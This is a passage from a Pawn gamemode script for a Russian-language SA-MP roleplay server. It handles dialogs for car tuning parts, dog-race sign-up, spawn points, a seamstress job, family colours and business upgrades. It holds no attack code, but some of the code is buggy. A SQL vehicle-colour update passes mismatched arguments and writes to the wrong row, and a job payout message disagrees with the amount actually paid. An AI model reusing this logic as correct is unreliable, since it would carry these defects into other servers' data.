					 	ShowPlayerDialog(playerid, 323, DIALOG_STYLE_LIST, "Боковые юбки", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLocos Chrome Strip\nLocos Chrome Flames\nLocos Chrome Arches \nLocos Chrome Trim\nLocos Wheelcovers\nTransfender", "Далее", "Отмена");
					}
        	    }
				case 7:
        	    {
					if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 401 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 527 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 415 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 589 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 546 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 517 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 603 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 436 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 439 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 580 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 549 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 477)
					{
			        	TuningBuyD(playerid,"Боковые юбки",1007,1017,5000);
        	    	}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 323, DIALOG_STYLE_LIST, "Боковые юбки", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLocos Chrome Strip\nLocos Chrome Flames\nLocos Chrome Arches \nLocos Chrome Trim\nLocos Wheelcovers\nTransfender", "Далее", "Отмена");
					}
        	    }
			}
		}
		case 324:
		{
		    if(!response) return 1;
		    switch(listitem)// Checking which list item was selected
        	{
        	    case 0:
        	    {
	                if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)

				    {
//			        new car = GetPlayerVehicleID(playerid);
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534) TuningBuy(playerid,"Решетки",1100,3000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 324, DIALOG_STYLE_LIST, "Решетки", "Locos Chrome Grill\nLocos Chrome Bars\nLocos Chrome Lights \nLocos Chrome Bullbar", "Далее", "Отмена");
					}
        	    }
        	    case 1:
        	    {
	                if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)

				    {
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534) TuningBuy(playerid,"Решетки",1123,3000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 324, DIALOG_STYLE_LIST, "Решетки", "Locos Chrome Grill\nLocos Chrome Bars\nLocos Chrome Lights \nLocos Chrome Bullbar", "Далее", "Отмена");
					}
        	    }
        	    case 2:
        	    {
	                if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534)

				    {
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534) TuningBuy(playerid,"Решетки",1125,3000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 324, DIALOG_STYLE_LIST, "Решетки", "Locos Chrome Grill\nLocos Chrome Bars\nLocos Chrome Lights \nLocos Chrome Bullbar", "Далее", "Отмена");
					}
        	    }
				case 3:
        	    {
	                if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535)

				    {
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535) TuningBuy(playerid,"Решетки",1117,3000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 324, DIALOG_STYLE_LIST, "Решетки", "Locos Chrome Grill\nLocos Chrome Bars\nLocos Chrome Lights \nLocos Chrome Bullbar", "Далее", "Отмена");
					}
        	    }
			}
		}
		case 325:
		{
		    if(!response) return 1;
		    switch(listitem)// Checking which list item was selected
        	{
        	    case 0:
        	    {
	                if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
			        {

		            if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuy(playerid,"Спойлер",1147,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565) TuningBuy(playerid,"Спойлер",1049,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559) TuningBuy(playerid,"Спойлер",1162,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561)TuningBuy(playerid,"Спойлер",1158,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560) TuningBuy(playerid,"Спойлер",1138,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558) TuningBuy(playerid,"Спойлер",1164,4000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 325, DIALOG_STYLE_LIST, "Спойлер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nTransfender Win\nTransfender Fury\nTransfender Alpha\nTransfender Pro\nTransfender Champ\nTransfender Drag", "Далее", "Отмена");
					}
        	    }
        	    case 1:
        	    {
	                if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 ||
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 560)
			        {


			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 562) TuningBuy(playerid,"Спойлер",1146,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 565) TuningBuy(playerid,"Спойлер",1150,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559) TuningBuy(playerid,"Спойлер",1158,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 561) TuningBuy(playerid,"Спойлер",1060,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560) TuningBuy(playerid,"Спойлер",1139,4000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558)  TuningBuy(playerid,"Спойлер",1163,4000);
					}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 325, DIALOG_STYLE_LIST, "Спойлер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nTransfender Win\nTransfender Fury\nTransfender Alpha\nTransfender Pro\nTransfender Champ\nTransfender Drag", "Далее", "Отмена");
					}
        	    }
        	    case 2:// Win
        	    {

                if(
                    GetVehicleModel(GetPlayerVehicleID(playerid)) == 401 ||//bravura
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||//buccaneer
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 527 ||//cadrona
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 415 ||//cheetah
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 546 ||//intruder
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 603 ||//phoenix
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 426 ||//premier
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 436 ||//previon
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 405 ||//sentinel
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 477 ||//stallion
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 580 ||//stafford
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 550 ||//sunrise
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 549)//tampa
					{
			        	TuningBuy(playerid,"Спойлер",1001,4000);
        	    	}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 325, DIALOG_STYLE_LIST, "Спойлер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nTransfender Win\nTransfender Fury\nTransfender Alpha\nTransfender Pro\nTransfender Champ\nTransfender Drag", "Далее", "Отмена");
					}
        	    }
        	    case 3: // Fury
        	    {
             		if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||//buccaneer
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 415 ||//cheetah
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 546 ||//intruder
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 517 ||//majestic
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 603 ||//phoenix
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 405 ||//sentinel
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 477 ||//stallion
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 580 ||//stafford
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 550 ||//sunrise
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 549)//tampa
					{
			        	TuningBuy(playerid,"Спойлер",1023,4000);
        	    	}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 325, DIALOG_STYLE_LIST, "Спойлер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nTransfender Win\nTransfender Fury\nTransfender Alpha\nTransfender Pro\nTransfender Champ\nTransfender Drag", "Далее", "Отмена");
					}
        	    }
        	    case 4: // Alpha
        	    {
             		if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 518 ||//buccaneer
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 415 ||//cheetah
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 401 ||//bravura
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 517 ||//majestic
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 426 ||//premier
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 436 ||//previon
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 477 ||//stallion
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 547 ||//primo
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 550 ||//sunrise
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 549)//tampa
					{
			        	TuningBuy(playerid,"Спойлер",1003,4000);
        	    	}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 325, DIALOG_STYLE_LIST, "Спойлер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nTransfender Win\nTransfender Fury\nTransfender Alpha\nTransfender Pro\nTransfender Champ\nTransfender Drag", "Далее", "Отмена");
					}
        	    }
        	    case 5: // Pro
        	    {

             		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 589 ||//club
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 492 ||//greenwood
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 547 ||//primo
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 405)//sentinel
					{
			        	TuningBuy(playerid,"Спойлер",1000,4000);
        	    	}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 325, DIALOG_STYLE_LIST, "Спойлер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nTransfender Win\nTransfender Fury\nTransfender Alpha\nTransfender Pro\nTransfender Champ\nTransfender Drag", "Далее", "Отмена");
					}
        	    }
				case 6: // Champ
        	    {
             		if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 527 ||//cadrona
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 542 ||//clover
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 405)//sentinel
					{
			        	TuningBuy(playerid,"Спойлер",1014,4000);
        	    	}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 325, DIALOG_STYLE_LIST, "Спойлер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nTransfender Win\nTransfender Fury\nTransfender Alpha\nTransfender Pro\nTransfender Champ\nTransfender Drag", "Далее", "Отмена");
					}
        	    }
				case 7: // Drag
        	    {

                	if(
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 546 ||//intruder
					GetVehicleModel(GetPlayerVehicleID(playerid)) == 517)//majestic
					{
			        	TuningBuy(playerid,"Спойлер",1002,4000);
        	    	}
					else
					{
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					 	ShowPlayerDialog(playerid, 325, DIALOG_STYLE_LIST, "Спойлер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nTransfender Win\nTransfender Fury\nTransfender Alpha\nTransfender Pro\nTransfender Champ\nTransfender Drag", "Далее", "Отмена");
					}
        	    }
			}
		}
		case 326:
		{
		    if(!response) return true;
		    if(DogGame) return SendClientMessage(playerid,CGREY,"Регистрация закрыта");
		    if(GetPVarInt(playerid,"DogReg") > 0) return SendClientMessage(playerid,CGREY,"Вы уже зарегистрированы");
		    if(PlayerInfo[playerid][pCash] < 25) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		    GiveMoney(playerid,-25);
			SetPVarInt(playerid,"DogReg",1);
			SendClientMessage(playerid,CYELLOW,"Вы зарегистрировались");
   			if(GetOnlineDog() == 10) StartDog();
		}
		case 327:
		{
		    if(!response) return BizMenu(playerid);
		    switch(listitem)
		    {
		        case 0: SetPVarInt(playerid,"CarModel",525),SetPVarInt(playerid,"CarPrice",5500);
		        //case 3: SetPVarInt(playerid,"CarModel",443),SetPVarInt(playerid,"CarPrice",10000);
		    }
		   	static const fmt_string1[] = "{FFFFFF}Вы действительно хотите заказать транспорт (id: %i) за %i$?";
			new str1[sizeof(fmt_string1)+30];
			format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"CarModel"),GetPVarInt(playerid,"CarPrice"));
			ShowPlayerDialog(playerid,177,DIALOG_STYLE_MSGBOX,"Покупка транспорта",str1,"Да","Отмена");
		}
		case 328:
		{
		    if(!response) return 1;
		    PlayerInfo[playerid][pWorkSpawn] = listitem;
		    switch(listitem)
		    {
		        case 0: SendClientMessage(playerid,-1,"Теперь вы будете спавниться в главном офисе");
		        case 1: SendClientMessage(playerid,-1,"Теперь вы будете спавниться в тюрьме");
		    }
		}
		case 329:
		{
		    if(!response) return true;
		    switch(GetPVarInt(playerid,"Shve"))
		    {
		        case 0:
		        {
         			if(GetPVarInt(playerid,"Pes") > 0)
					{
						DeletePVar(playerid,"Pes");
						DeletePVar(playerid,"PesW");
						DisablePlayerCheckpoint(playerid);
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
						if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
						if(IsValidDynamicCP(GetPVarInt(playerid,"PesCheck"))) DestroyDynamicCP(GetPVarInt(playerid,"PesCheck")),DeletePVar(playerid,"PesCheck");
     					if(IsValidDynamicPickup(GetPVarInt(playerid,"PesPick"))) DestroyDynamicPickup(GetPVarInt(playerid,"PesPick")),DeletePVar(playerid,"PesPick");
						DeletePVar(playerid,"PesC");
					}
					if(GetPVarInt(playerid,"Povar") > 0)
					{
						DeletePVar(playerid,"Povar");
						DeletePVar(playerid,"PovarW");
						DisablePlayerCheckpoint(playerid);
						DeletePVar(playerid,"PovarC");
						DeletePVar(playerid,"PovarM");
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
						if(IsValidDynamicObject(GetPVarInt(playerid,"PovarObject"))) DestroyDynamicObject(GetPVarInt(playerid,"PovarObject")),DeletePVar(playerid,"PovarObject");
						DeletePVar(playerid,"PovarEda");
					}
		            SetPVarInt(playerid,"Shve",1);
		            SetPVarInt(playerid,"ShveC",0);
		            SetPVarInt(playerid,"ShveW",1);
 					ApplyDynamicActorAnimation(ShveiBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(ShveiText,-1,"Держи форму и быстро за работу!");
					SetTimerEx("ClearBotGlobalClear", 3000, false,"dd",ShveiBot,_:ShveiText);
		            SendClientMessage(playerid,CGREEN,"Вы начали работу швеи. Ваша задача: сшить вещь и упаковать ее");
		            SetPlayerCheckpoint(playerid, 2856.0452,-1211.2482,1028.0563, 1.0);
		        }
		        case 1:
		        {
           			static const fmt_string1[] = "Вы закончили работу швеи. Вы перенесли %i упакованных вещей и заработали $%i";
					new str1[sizeof(fmt_string1)+4+4];
					format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"ShveC"),GetPVarInt(playerid,"ShveC")*1);
					SendClientMessage(playerid,CGREEN,str1);
					GiveMoney(playerid,GetPVarInt(playerid,"ShveC")*50);
					if(!PlayerInfo[playerid][pQuestS][14])
					{
						PlayerQuest[playerid][14][0] += GetPVarInt(playerid,"ShveC");
						CheckQuest(playerid,14);
					}
     				DeletePVar(playerid,"Shve");
		            DeletePVar(playerid,"ShveW");
		            DisablePlayerCheckpoint(playerid);
					SetPlayerSpecialAction(playerid,0);
					if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
					static const fmt_str1[] = "Хорошая работа. Держи свои $%i";
					new string1[sizeof(fmt_str1)+10];
					format(string1, sizeof(string1), fmt_str1, GetPVarInt(playerid,"ShveC")*1);
					ApplyDynamicActorAnimation(ShveiBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(ShveiText,-1,string1);
					SetTimerEx("ClearBotGlobalClear", 3000, false,"dd",ShveiBot,_:ShveiText);
     				DeletePVar(playerid,"ShveC");
					if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);

		        }
		    }
		}
		case 330:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
		        {
		            PlayerInfo[playerid][pSpawnChange] = 0;
		            SendClientMessage(playerid,-1,"Теперь вы будете спавниться в обычном месте");
		        }
		        case 1:
		        {
		            if(!PlayerInfo[playerid][pMember]) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
					PlayerInfo[playerid][pSpawnChange] = 1;
		            SendClientMessage(playerid,-1,"Теперь вы будете спавниться на базе организации");
		            if(PlayerInfo[playerid][pMember] == F_LVPD) return ShowPlayerDialog(playerid,328,DIALOG_STYLE_LIST,"Изменить место появления","Главный офис\nОфис Fort-Carson\nТюрьма","Далее","Назад");
		        }
		        case 2:
		        {
		            if(!GetPlayerHouse(playerid) && !GetPlayerZasel(playerid) && !GetPlayerKom(playerid)) return SendClientMessage(playerid,CGREY,"Вы нигде не живете");
		            PlayerInfo[playerid][pSpawnChange] = 2;
		            SendClientMessage(playerid,-1,"Теперь вы будете спавниться в своем жилье");
		        }
		        case 3:
		        {
		            if(!PlayerInfo[playerid][pFam] || !GetFamHouse(PlayerInfo[playerid][pFam])) return SendClientMessage(playerid,CGREY,"Вы не состоите в семье или у семьи нет дома");
		            PlayerInfo[playerid][pSpawnChange] = 3;
		            SendClientMessage(playerid,-1,"Теперь вы будете спавниться в доме семьи");
		        }
		    }
		}
		case 331:
		{
		    if(!response) return ShowSetFam(playerid);
		    new hexcolor;
		    if(sscanf(inputtext, "h", hexcolor)) return ShowPlayerDialog(playerid,331,DIALOG_STYLE_INPUT,"Цвет семьи","{FFFFFF}Введите цвет в hex формате:\nПример: 0x4AD4A6FF","Далее","Отмена");
   			if(GetPVarInt(playerid,"FloodColor") > gettime()) return SendClientMessage(playerid,CGREY,"Менять цвет семьи можно раз в минуту");
	  		SetPVarInt(playerid,"FloodColor",gettime() + 60);
			FamInfo[PlayerInfo[playerid][pFam]][fColor] = hexcolor;
            static const fmt_string[] = "[%s] %s установил новый цвет семьи";
			new str[sizeof(fmt_string)+50+32+5];
			format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[playerid][pFam]][fName],PlayerInfo[playerid][pSendername]);
			SendFamMessage(PlayerInfo[playerid][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
			new f =PlayerInfo[playerid][pFam];
			new color1 = HexColorToVehColor(FamInfo[f][fColor]);
			for(new i = 1; i<= TOTALV; i++)
		   	{
		   		if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
		   	    if(VInfo[i][vfam] != PlayerInfo[playerid][pFam]) continue;
	   	       	ChangeVehicleColor(VInfo[i][vcar], color1, color1);
                VInfo[i][vcolor1] = color1;
                VInfo[i][vcolor2] = color1;
                query = "";
                format(query, sizeof(query), "UPDATE `veh` SET `color1` = '%d',`color2` = '%d' WHERE id = '%d' LIMIT 1",i+1,color1,color1,i);
				mysql_tquery(mysql,query);
		   	}
 	    	query = "";
			format(query, sizeof(query), "UPDATE `fam` SET `color` = %d WHERE id = '%d' LIMIT 1",FamInfo[PlayerInfo[playerid][pFam]][fColor],PlayerInfo[playerid][pFam]);
			mysql_tquery(mysql,query);
			ShowSetFam(playerid);
		}
		case 336:
		{
		    if(!response) return cmd_family(playerid);
		    switch(listitem)
		    {
		        case 1:
		        {
		            if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0)
		            {
						new i = PlayerInfo[playerid][pFam];
						if(!FamInfo[i][fHouse])
						{
		                	if(!GetPlayerHouse(playerid)) return SendClientMessage(playerid,CGREY,"Вы не владете домом");
							FamInfo[i][fHouse] = GetPVarInt(playerid,"PlayerHouse");
							static const fmt_string[] = "[%s] %s установил дом семьи";
							new str[sizeof(fmt_string)+50+32+5];
							format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[playerid][pFam]][fName],PlayerInfo[playerid][pSendername]);
							SendFamMessage(PlayerInfo[playerid][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
		                }
		                else
		                {
		                    FamInfo[i][fHouse] = 0;
		                    static const fmt_string[] = "[%s] %s убрал дом семьи";
							new str[sizeof(fmt_string)+50+32+5];
							format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[playerid][pFam]][fName],PlayerInfo[playerid][pSendername]);
							SendFamMessage(PlayerInfo[playerid][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
		                }
		                query = "";
		                format(query, sizeof(query), "UPDATE `fam` SET `house` = %d WHERE id = '%d' LIMIT 1",FamInfo[i][fHouse],i);
						mysql_tquery(mysql,query);
						ShowSetFam(playerid);
		            }
		            else SendClientMessage(playerid, CGREY, "Доступно только лидеру семьи");
		        }
		        case 2:
		        {
		            if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0)
		            {
						new i = PlayerInfo[playerid][pFam];
						if(FamInfo[i][fHouse])
						{
		                	if(!GetPlayerHouse(playerid)) return SendClientMessage(playerid,CGREY,"Вы не владете домом");
		                	if(!FamInfo[i][fShkaf])
		                	{
			                	static const fmt_string[] = "[%s] %s разрешил пользовать шкафом в доме семьи";
								new str[sizeof(fmt_string)+50+32+5];
								format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[playerid][pFam]][fName],PlayerInfo[playerid][pSendername]);
								SendFamMessage(PlayerInfo[playerid][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
								FamInfo[i][fShkaf] = 1;
							}
							else
		                	{
			                	static const fmt_string[] = "[%s] %s запретил пользовать шкафом в доме семьи";
								new str[sizeof(fmt_string)+50+32+5];
								format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[playerid][pFam]][fName],PlayerInfo[playerid][pSendername]);
								SendFamMessage(PlayerInfo[playerid][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
								FamInfo[i][fShkaf] = 0;
							}
							query = "";
							format(query, sizeof(query), "UPDATE `fam` SET `shkaf` = %d WHERE id = '%d' LIMIT 1",FamInfo[i][fShkaf],i);
							mysql_tquery(mysql,query);
		                }
		                ShowSetFam(playerid);
		            }
		            else SendClientMessage(playerid, CGREY, "Доступно только лидеру семьи");
		        }
		        case 0:
		        {
		            if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0)
		            {
						ShowPlayerDialog(playerid,331,DIALOG_STYLE_INPUT,"Цвет семьи","{FFFFFF}Введите цвет в hex формате:\nПример: 0x4AD4A6FF","Далее","Отмена");
		            }
		            else SendClientMessage(playerid, CGREY, "Доступно только лидеру семьи");
		        }
		    }
		}
		case 337:
		{
		    if(!response) return cmd_biz(playerid,"");
		    query = "";
			switch(listitem)
			{
				case 0:
				{
				    
				    format(query,sizeof(query),"{FFFFFF}Улучшение 'Расширение склада/места'.\nУвеличит склад или наличие мест в Вашем бизнесе.\nС 3.000 продуктов до 5.000 или же с 10 мест до 15 мест.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}%d$",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10);
					ShowPlayerDialog(playerid,180,DIALOG_STYLE_MSGBOX,"Улучшение",query,"Далее","Назад");
				}
				case 1:
				{
				    format(query,sizeof(query),"{FFFFFF}Улучшение 'Дополнительное рабочее место'.\nДобавит возможность назначить управляющего.\nКоторый сможет управлять бизнесом во время вашего отсутствия.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}%d$",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10);
					ShowPlayerDialog(playerid,180,DIALOG_STYLE_MSGBOX,"Улучшение",query,"Далее","Назад");
				}
				case 2:
				{
				    format(query,sizeof(query),"{FFFFFF}Улучшение 'Добавить бизнес в GPS-навигатор'.\nДобавит Ваш бизнес в GPS-навигатор.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}%d$",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10);
					ShowPlayerDialog(playerid,180,DIALOG_STYLE_MSGBOX,"Улучшение",query,"Далее","Назад");
				}
				case 3:
				{
				    format(query,sizeof(query),"{FFFFFF}Улучшение 'Добавить звук при входе'.\nДобавит возможность добавить звук при входе в бизнес.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}800000$",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*8);
					ShowPlayerDialog(playerid,180,DIALOG_STYLE_MSGBOX,"Улучшение",query,"Далее","Назад");
				}
				case 4:
				{
				    format(query,sizeof(query),"{FFFFFF}Улучшение 'Оплата банковской картой'.\nДобавит возможность покупателей оплачивать банковской картой.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}%d$",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*3);
					ShowPlayerDialog(playerid,180,DIALOG_STYLE_MSGBOX,"Улучшение",query,"Далее","Назад");
				}
			}
			ListNick[playerid][0] = listitem;
		}
		case 338:
		{
		    if(!response) return cmd_menu(playerid,"");
		    if(PlayerInfo[playerid][pUl][listitem]) return SendClientMessage(playerid,CGREY,"У Вас уже есть данное улучшение!");
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,339,DIALOG_STYLE_MSGBOX,"Улучшение","{FFFFFF}Улучшение 'Обжора'.\nГолод будет тратится в два раза меньше.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}5000$","Далее","Назад");
				case 1: ShowPlayerDialog(playerid,339,DIALOG_STYLE_MSGBOX,"Улучшение","{FFFFFF}Улучшение 'Стрелок'.\nПрокачка скиллов оружия будет в два раза быстрее.\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}5000$","Далее","Назад");
				case 2: ShowPlayerDialog(playerid,339,DIALOG_STYLE_MSGBOX,"Улучшение","{FFFFFF}Улучшение 'Рюкзак'.\nУвеличит вместимость материалов и наркотиков.\nНаркотиков и метериалов с 500 до 1.0000\n\nВы действительно хотите установить данное улучшение?\nЦена: {f7ae11}150000$","Далее","Назад");
			}
			ListNick[playerid][0] = listitem;
		}
		case 339:
		{
		    if(!response) return ShowPUl(playerid);
		    if(PlayerInfo[playerid][pUl][ListNick[playerid][0]]) return 1;
		    switch(ListNick[playerid][0])
		    {
	   		 	case 0: if(PlayerInfo[playerid][pCash] < 5000) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    case 1: if(PlayerInfo[playerid][pCash] < 5000) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    case 2: if(PlayerInfo[playerid][pCash] < 150000) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			}
   			switch(ListNick[playerid][0])
		    {
	   		 	case 0: GiveMoney(playerid,-5000);
			    case 1: GiveMoney(playerid,-5000);
			    case 2: GiveMoney(playerid,-150000);
			}
			PlayerInfo[playerid][pUl][ListNick[playerid][0]] = 1;
			SendClientMessage(playerid,CREWARD,"Вы приобрели улучшение");
		}
		case 340:
		{
		    if(!response)
			{
			    return DeletePVar(playerid,"CheckPlayer");
			}
			if(!listitem && !GetPVarInt(playerid,"CheckPlayer"))
			{
			    return ShowPlayerDialog(playerid,418,DIALOG_STYLE_INPUT,"Создать контакт","{ffffff}Введите название контакта и номер телефона через запятую:\n\nНапример: Ivan_Ivan,567876","Далее","Закрыть");
			}
			if(listitem > 0 && listitem < 15)
			{
				SetPVarInt(playerid,"Nomer",ListNick[playerid][listitem]);
